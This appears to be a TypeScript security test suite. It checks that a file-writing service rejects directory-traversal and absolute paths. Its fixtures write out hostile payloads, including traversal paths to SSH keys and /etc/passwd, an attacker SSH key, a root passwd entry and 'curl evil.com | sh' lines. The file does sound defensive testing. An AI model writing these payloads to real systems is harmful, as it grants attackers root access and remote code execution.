import { describe, it } from 'node:test';
import * as assert from 'node:assert';
import * as path from 'path';
import * as fs from 'fs';
import { FileWriterService } from '../services/FileWriterService.js';
import { validateFilePath } from '../utils/SecurityUtils.js';

/**
 * CB-2 Security Tests: Directory Traversal Prevention in File Paths
 * 
 * These tests verify that the validate_and_write tool properly validates
 * file paths to prevent directory traversal attacks that could allow
 * writing files outside the project root directory.
 * 
 * Vulnerability: path.join() does NOT prevent traversal - e.g.,
 * path.join('/home/user/project', '../../.ssh/authorized_keys')
 * resolves to '/home/user/.ssh/authorized_keys'
 * 
 * Fix: validateFilePath() ensures resolved paths stay within projectRoot
 */

describe('CB-2: Directory Traversal Prevention in File Paths', () => {
  let testProjectRoot: string;

  function setupValidTestProject(): string {
    const root = path.join(process.cwd(), 'test-proj-cb2-' + Date.now());
    if (!fs.existsSync(root)) {
      fs.mkdirSync(root, { recursive: true });
    }
    // Create minimal package.json and tsconfig.json
    fs.writeFileSync(
      path.join(root, 'package.json'),
      JSON.stringify({ name: 'test-project', version: '1.0.0' }, null, 2)
    );
    fs.writeFileSync(
      path.join(root, 'tsconfig.json'),
      JSON.stringify({ compilerOptions: { strict: true } }, null, 2)
    );
    return root;
  }

  function cleanupTest(root: string) {
    if (fs.existsSync(root)) {
      fs.rmSync(root, { recursive: true, force: true });
    }
  }

  describe('SecurityUtils.validateFilePath', () => {
    it('should accept valid relative paths within project', () => {
      const projectRoot = '/home/user/project';
      const validPaths = [
        'src/test.ts',
        'src/pages/LoginPage.ts',
        'src/features/login.feature',
        'src/step-definitions/login.steps.ts',
        './src/utils/helper.ts',
        'test-data/users.json',
        'config/mcp-config.json'
      ];

      for (const validPath of validPaths) {
        assert.doesNotThrow(
          () => validateFilePath(projectRoot, validPath),
          `Valid path "${validPath}" should not throw`
        );
      }
    });

    it('should accept paths with dots in filenames', () => {
      const projectRoot = '/home/user/project';
      const validPaths = [
        'src/pages/Login.android.ts',
        'src/pages/Login.ios.ts',
        'config/users.staging.json',
        'test-data/mock.v1.2.3.json'
      ];

      for (const validPath of validPaths) {
        assert.doesNotThrow(
          () => validateFilePath(projectRoot, validPath),
          `Valid path with dots "${validPath}" should not throw`
        );
      }
    });

    it('should accept deeply nested paths', () => {
      const projectRoot = '/home/user/project';
      const deepPath = 'src/features/modules/auth/pages/helpers/validators/email.validator.ts';
      
      assert.doesNotThrow(
        () => validateFilePath(projectRoot, deepPath),
        'Deeply nested valid path should not throw'
      );
    });

    it('should reject path with parent directory traversal (..)', () => {
      const projectRoot = '/home/user/project';
      const maliciousPath = '../outside-project/evil.ts';
      
      assert.throws(
        () => validateFilePath(projectRoot, maliciousPath),
        /Path traversal detected/,
        'Single-level parent traversal should be rejected'
      );
    });

    it('should reject path with multiple parent directory traversals', () => {
      const projectRoot = '/home/user/project';
      const maliciousPath = '../../.ssh/authorized_keys';
      
      assert.throws(
        () => validateFilePath(projectRoot, maliciousPath),
        /Path traversal detected/,
        'Multi-level parent traversal should be rejected'
      );
    });

    it('should reject the exact CB-2 documentation example', () => {
      // From CB-2 docs: path.join('/home/user/project', '../../.ssh/authorized_keys')
      const projectRoot = '/home/user/project';
      const cb2Payload = '../../.ssh/authorized_keys';
      
      assert.throws(
        () => validateFilePath(projectRoot, cb2Payload),
        /Path traversal detected/,
        'CB-2 documented payload should be rejected'
      );
    });

    it('should reject deep traversal to sensitive system files', () => {
      const projectRoot = '/home/user/project';
      const maliciousPaths = [
        '../../../etc/passwd',
        '../../../etc/shadow',
        '../../../../root/.ssh/id_rsa',
        '../../../../../var/log/auth.log'
      ];

      for (const maliciousPath of maliciousPaths) {
        assert.throws(
          () => validateFilePath(projectRoot, maliciousPath),
          /Path traversal detected/,
          `Traversal to "${maliciousPath}" should be rejected`
        );
      }
    });

    it('should reject absolute paths', () => {
      const projectRoot = '/home/user/project';
      const absolutePaths = [
        '/etc/passwd',
        '/home/attacker/.ssh/authorized_keys',
        '/var/www/html/shell.php',
        'C:\\Windows\\System32\\config\\SAM',
        '/usr/local/bin/malicious-script.sh'
      ];

      for (const absolutePath of absolutePaths) {
        assert.throws(
          () => validateFilePath(projectRoot, absolutePath),
          /Absolute file paths are not allowed/,
          `Absolute path "${absolutePath}" should be rejected`
        );
      }
    });

    it('should reject Windows-style absolute paths', () => {
      const projectRoot = 'C:\\Users\\developer\\project';
      const windowsAbsolutePaths = [
        'C:\\Windows\\System32\\drivers\\etc\\hosts',
        'D:\\sensitive-data.txt',
        'C:\\ProgramData\\secrets.json'
      ];

      for (const absolutePath of windowsAbsolutePaths) {
        assert.throws(
          () => validateFilePath(projectRoot, absolutePath),
          /Absolute file paths are not allowed/,
          `Windows absolute path "${absolutePath}" should be rejected`
        );
      }
    });

    it('should reject traversal mixed with valid path components', () => {
      const projectRoot = '/home/user/project';
      const sneakyPaths = [
        'src/../../etc/passwd',
        'src/pages/../../../.ssh/authorized_keys',
        './src/../../../root/.bashrc',
        'valid/path/../../../../../../etc/shadow'
      ];

      for (const sneakyPath of sneakyPaths) {
        assert.throws(
          () => validateFilePath(projectRoot, sneakyPath),
          /Path traversal detected/,
          `Sneaky traversal "${sneakyPath}" should be rejected`
        );
      }
    });

    it('should reject empty or null file paths', () => {
      const projectRoot = '/home/user/project';

      assert.throws(
        () => validateFilePath(projectRoot, ''),
        /File path is required/,
        'Empty string should be rejected'
      );

      assert.throws(
        () => validateFilePath(projectRoot, null as any),
        /File path is required/,
        'Null should be rejected'
      );

      assert.throws(
        () => validateFilePath(projectRoot, undefined as any),
        /File path is required/,
        'Undefined should be rejected'
      );
    });

    it('should handle path normalization correctly', () => {
      const projectRoot = '/home/user/project';
      
      // These look safe but normalize to outside the project
      const normalizedEvilPaths = [
        'src/./../../etc/passwd',
        'src/pages/./../../.ssh/authorized_keys'
      ];

      for (const evilPath of normalizedEvilPaths) {
        assert.throws(
          () => validateFilePath(projectRoot, evilPath),
          /Path traversal detected/,
          `Normalized traversal "${evilPath}" should be rejected`
        );
      }
    });

    it('should accept paths starting with ./ that stay within project', () => {
      const projectRoot = '/home/user/project';
      const validDotPaths = [
        './src/test.ts',
        './src/pages/Login.ts',
        './config/settings.json'
      ];

      for (const validPath of validDotPaths) {
        assert.doesNotThrow(
          () => validateFilePath(projectRoot, validPath),
          `Valid ./ path "${validPath}" should not throw`
        );
      }
    });

    it('should detect traversal on Windows paths', () => {
      const projectRoot = 'C:\\Users\\developer\\project';
      const windowsTraversalPaths = [
        '..\\..\\sensitive.txt',
        '..\\..\\..\\Windows\\System32\\config\\SAM',
        'src\\..\\..\\..\\ProgramData\\secret.json'
      ];

      for (const traversalPath of windowsTraversalPaths) {
        assert.throws(
          () => validateFilePath(projectRoot, traversalPath),
          /Path traversal detected/,
          `Windows traversal "${traversalPath}" should be rejected`
        );
      }
    });
  });

  describe('FileWriterService.validateAndWrite - CB-2 Protection', () => {
    it('should reject files with parent directory traversal', async () => {
      const validRoot = setupValidTestProject();
      
      try {
        const fileWriterService = new FileWriterService();
        const maliciousFiles = [
          { path: '../outside-project/evil.ts', content: 'export const evil = true;' }
        ];

        const result = await fileWriterService.validateAndWrite(validRoot, maliciousFiles);
        const parsed = JSON.parse(result);

        assert.strictEqual(parsed.success, false, 'Should fail security validation');
        assert.strictEqual(parsed.phase, 'security-validation', 'Should fail at security phase');
        assert.ok(parsed.error.includes('Path traversal detected'), 'Should mention path traversal');
        assert.strictEqual(parsed.file, '../outside-project/evil.ts', 'Should identify the malicious file');
      } finally {
        cleanupTest(validRoot);
      }
    });

    it('should reject the exact CB-2 attack: overwriting authorized_keys', async () => {
      const validRoot = setupValidTestProject();
      
      try {
        const fileWriterService = new FileWriterService();
        // Attempt to overwrite SSH authorized_keys via directory traversal
        const sshAttackFiles = [
          { 
            path: '../../.ssh/authorized_keys', 
            content: 'ssh-rsa AAAAB3... attacker@evil.com' 
          }
        ];

        const result = await fileWriterService.validateAndWrite(validRoot, sshAttackFiles);
        const parsed = JSON.parse(result);

        assert.strictEqual(parsed.success, false, 'SSH attack should be rejected');
        assert.strictEqual(parsed.phase, 'security-validation', 'Should fail at security phase');
        assert.ok(parsed.error.includes('Path traversal detected'), 'Should detect traversal');
      } finally {
        cleanupTest(validRoot);
      }
    });

    it('should reject attempt to overwrite /etc/passwd', async () => {
      const validRoot = setupValidTestProject();
      
      try {
        const fileWriterService = new FileWriterService();
        const etcPasswdAttack = [
          { 
            path: '../../../etc/passwd', 
            content: 'attacker:x:0:0::/root:/bin/bash' 
          }
        ];

        const result = await fileWriterService.validateAndWrite(validRoot, etcPasswdAttack);
        const parsed = JSON.parse(result);

        assert.strictEqual(parsed.success, false, '/etc/passwd attack should be rejected');
        assert.strictEqual(parsed.phase, 'security-validation', 'Should fail at security phase');
      } finally {
        cleanupTest(validRoot);
      }
    });

    it('should reject absolute path attempts', async () => {
      const validRoot = setupValidTestProject();
      
      try {
        const fileWriterService = new FileWriterService();
        const absolutePathFiles = [
          { path: '/tmp/backdoor.sh', content: '#!/bin/bash\ncurl evil.com | sh' }
        ];

        const result = await fileWriterService.validateAndWrite(validRoot, absolutePathFiles);
        const parsed = JSON.parse(result);

        assert.strictEqual(parsed.success, false, 'Absolute path should be rejected');
        assert.strictEqual(parsed.phase, 'security-validation', 'Should fail at security phase');
        assert.ok(parsed.error.includes('Absolute file paths are not allowed'), 'Should mention absolute path');
      } finally {
        cleanupTest(validRoot);
      }
    });

    it('should reject mixed attack with valid and malicious paths', async () => {
      const validRoot = setupValidTestProject();
      
      try {
        const fileWriterService = new FileWriterService();
        const mixedFiles = [
          { path: 'src/valid.ts', content: 'export const valid = true;' },
          { path: '../../evil.ts', content: 'export const evil = true;' },
          { path: 'src/alsoValid.ts', content: 'export const alsoValid = true;' }
        ];

        const result = await fileWriterService.validateAndWrite(validRoot, mixedFiles);
        const parsed = JSON.parse(result);

        assert.strictEqual(parsed.success, false, 'Should reject entire batch');
        assert.strictEqual(parsed.phase, 'security-validation', 'Should fail at security phase');
        assert.strictEqual(parsed.file, '../../evil.ts', 'Should identify malicious file');
      } finally {
        cleanupTest(validRoot);
      }
    });

    it('should accept all files when paths are valid', async () => {
      const validRoot = setupValidTestProject();
      
      try {
        const fileWriterService = new FileWriterService();
        const validFiles = [
          { path: 'src/test.ts', content: 'export const test = true;' },
          { path: 'src/pages/LoginPage.ts', content: 'export class LoginPage {}' },
          { path: 'config/settings.json', content: '{"valid": true}' }
        ];

        const result = await fileWriterService.validateAndWrite(validRoot, validFiles);
        const parsed = JSON.parse(result);

        // Should pass security validation (may fail at other phases like tsc)
        assert.notStrictEqual(parsed.phase, 'security-validation', 
          'Should pass security validation with all valid paths');
        
        // Verify no files were written outside project
        const outsideProject = path.join(path.dirname(validRoot), 'evil.ts');
        assert.ok(!fs.existsSync(outsideProject), 'No files should be written outside project');
      } finally {
        cleanupTest(validRoot);
      }
    });

    it('should prevent file writes before security validation completes', async () => {
      const validRoot = setupValidTestProject();
      const outsideFile = path.join(path.dirname(validRoot), 'CB2_MARKER.txt');
      
      // Clean up any existing marker
      if (fs.existsSync(outsideFile)) {
        fs.unlinkSync(outsideFile);
      }
      
      try {
        const fileWriterService = new FileWriterService();
        const traversalFiles = [
          { path: '../CB2_MARKER.txt', content: 'This should never be written' }
        ];

        await fileWriterService.validateAndWrite(validRoot, traversalFiles);

        // Verify the file was NOT written (traversal was blocked)
        assert.ok(!fs.existsSync(outsideFile), 
          'Traversal file should never be written to disk');
      } finally {
        cleanupTest(validRoot);
        if (fs.existsSync(outsideFile)) {
          fs.unlinkSync(outsideFile);
        }
      }
    });

    it('should validate each file path individually', async () => {
      const validRoot = setupValidTestProject();
      
      try {
        const fileWriterService = new FileWriterService();
        // Multiple malicious paths
        const multipleTraversals = [
          { path: 'src/valid.ts', content: 'export const valid = true;' },
          { path: '../../etc/passwd', content: 'attacker::0:0:::/bin/bash' },
          { path: '../../../root/.bashrc', content: 'curl evil.com | sh' }
        ];

        const result = await fileWriterService.validateAndWrite(validRoot, multipleTraversals);
        const parsed = JSON.parse(result);

        assert.strictEqual(parsed.success, false, 'Should reject on first malicious path');
        assert.strictEqual(parsed.phase, 'security-validation', 'Should fail at security phase');
        // Should catch the first malicious file in the array
        assert.ok(parsed.file === '../../etc/passwd' || parsed.file === '../../../root/.bashrc',
          'Should identify a malicious file');
      } finally {
        cleanupTest(validRoot);
      }
    });

    it('should handle Windows-style traversal attacks', async () => {
      const validRoot = setupValidTestProject();
      
      try {
        const fileWriterService = new FileWriterService();
        const windowsTraversal = [
          { path: '..\\..\\Windows\\System32\\evil.dll', content: 'malicious content' }
        ];

        const result = await fileWriterService.validateAndWrite(validRoot, windowsTraversal);
        const parsed = JSON.parse(result);

        assert.strictEqual(parsed.success, false, 'Windows traversal should be rejected');
        assert.strictEqual(parsed.phase, 'security-validation', 'Should fail at security phase');
      } finally {
        cleanupTest(validRoot);
      }
    });
  });

  describe('Regression: CB-2 Original Vulnerability Scenarios', () => {
    it('should block the exact scenario from CB-2 documentation', async () => {
      // From CB-2: path.join('/home/user/project', '../../.ssh/authorized_keys')
      // resolves to '/home/user/.ssh/authorized_keys'
      const validRoot = setupValidTestProject();
      
      try {
        const fileWriterService = new FileWriterService();
        const cb2Payload = [
          { 
            path: '../../.ssh/authorized_keys', 
            content: 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ attacker@evil.com' 
          }
        ];

        const result = await fileWriterService.validateAndWrite(validRoot, cb2Payload);
        const parsed = JSON.parse(result);

        assert.strictEqual(parsed.success, false, 'CB-2 payload should be rejected');
        assert.strictEqual(parsed.phase, 'security-validation', 'Should fail at security validation');
        assert.ok(parsed.error.includes('Path traversal detected'), 'Should detect path traversal');
        
        // Verify the SSH authorized_keys file was never created
        const sshPath = path.join(path.dirname(path.dirname(validRoot)), '.ssh', 'authorized_keys');
        assert.ok(!fs.existsSync(sshPath), 'SSH file should never be created');
      } finally {
        cleanupTest(validRoot);
      }
    });

    it('should validate paths before any file system operations occur', async () => {
      const validRoot = setupValidTestProject();
      
      try {
        const fileWriterService = new FileWriterService();
        const traversalPath = '../../../etc/shadow';
        const files = [{ path: traversalPath, content: 'malicious' }];

        const result = await fileWriterService.validateAndWrite(validRoot, files);
        const parsed = JSON.parse(result);

        assert.strictEqual(parsed.success, false, 'Should fail immediately');
        assert.strictEqual(parsed.phase, 'security-validation', 
          'Should fail at security validation phase before any other operations');
        
        // Verify staging directory was never created
        const stagingDir = path.join(validRoot, '.mcp-staging');
        assert.ok(!fs.existsSync(stagingDir), 
          'Staging directory should not be created for invalid paths');
      } finally {
        cleanupTest(validRoot);
      }
    });

    it('should maintain defense-in-depth: check every file in batch', async () => {
      const validRoot = setupValidTestProject();
      
      try {
        const fileWriterService = new FileWriterService();
        // Mix of valid files with one malicious path late in the array
        const sneakyBatch = [
          { path: 'src/file1.ts', content: 'export const a = 1;' },
          { path: 'src/file2.ts', content: 'export const b = 2;' },
          { path: 'src/file3.ts', content: 'export const c = 3;' },
          { path: '../../../etc/passwd', content: 'root:x:0:0:root:/root:/bin/bash' }
        ];

        const result = await fileWriterService.validateAndWrite(validRoot, sneakyBatch);
        const parsed = JSON.parse(result);

        assert.strictEqual(parsed.success, false, 'Should catch malicious file even late in batch');
        assert.strictEqual(parsed.phase, 'security-validation', 'Should fail at security phase');
        
        // Verify none of the files were written (not even the valid ones)
        assert.ok(!fs.existsSync(path.join(validRoot, 'src', 'file1.ts')), 
          'No files should be written when batch contains malicious path');
      } finally {
        cleanupTest(validRoot);
      }
    });
  });

  describe('Edge Cases and Special Scenarios', () => {
    it('should handle deeply nested valid paths correctly', async () => {
      const validRoot = setupValidTestProject();
      
      try {
        const fileWriterService = new FileWriterService();
        const deepPath = 'src/features/auth/pages/login/components/form/validators/email.validator.ts';
        const files = [{ path: deepPath, content: 'export const validateEmail = () => true;' }];

        const result = await fileWriterService.validateAndWrite(validRoot, files);
        const parsed = JSON.parse(result);

        // Should pass security validation
        assert.notStrictEqual(parsed.phase, 'security-validation',
          'Deep but valid paths should pass security validation');
      } finally {
        cleanupTest(validRoot);
      }
    });

    it('should reject sneaky traversal hidden in deep path', async () => {
      const validRoot = setupValidTestProject();
      
      try {
        const fileWriterService = new FileWriterService();
        const sneakyPath = 'src/pages/../../../../../../etc/passwd';
        const files = [{ path: sneakyPath, content: 'malicious' }];

        const result = await fileWriterService.validateAndWrite(validRoot, files);
        const parsed = JSON.parse(result);

        assert.strictEqual(parsed.success, false, 'Hidden traversal should be detected');
        assert.strictEqual(parsed.phase, 'security-validation', 'Should fail at security phase');
      } finally {
        cleanupTest(validRoot);
      }
    });

    it('should handle paths with legitimate dots in filenames', async () => {
      const validRoot = setupValidTestProject();
      
      try {
        const fileWriterService = new FileWriterService();
        const dottedFiles = [
          { path: 'src/Login.android.ts', content: 'export class LoginAndroid {}' },
          { path: 'src/Login.ios.ts', content: 'export class LoginIOS {}' },
          { path: 'config/users.staging.json', content: '{}' }
        ];

        const result = await fileWriterService.validateAndWrite(validRoot, dottedFiles);
        const parsed = JSON.parse(result);

        // Should pass security validation
        assert.notStrictEqual(parsed.phase, 'security-validation',
          'Files with dots in names should pass security validation');
      } finally {
        cleanupTest(validRoot);
      }
    });
  });
});